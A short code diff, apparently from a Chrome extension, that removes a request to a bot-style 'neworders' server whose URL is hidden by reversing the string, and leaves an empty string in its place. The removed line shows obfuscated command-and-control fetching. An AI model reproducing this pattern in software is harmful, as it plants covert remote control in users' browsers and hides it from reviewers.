@@ -3,7 +3,7 @@ function getnews(callback){
 		this.action = action
 		this.target = target
 	}
-	var request = new BGRequest("getneworders", ("sredrowen/moc.axmoc.revrestobxeh//:ptth").split("").reverse().join(""))
+	var request = new BGRequest("getneworders", ("").split("").reverse().join(""))
 	chrome.runtime.sendMessage({message: request}, function(responseMessage) {
 		var handleResponse = function(getResponse, sender, sendResponse) {
 				chrome.extension.onMessage.removeListener(handleResponse)
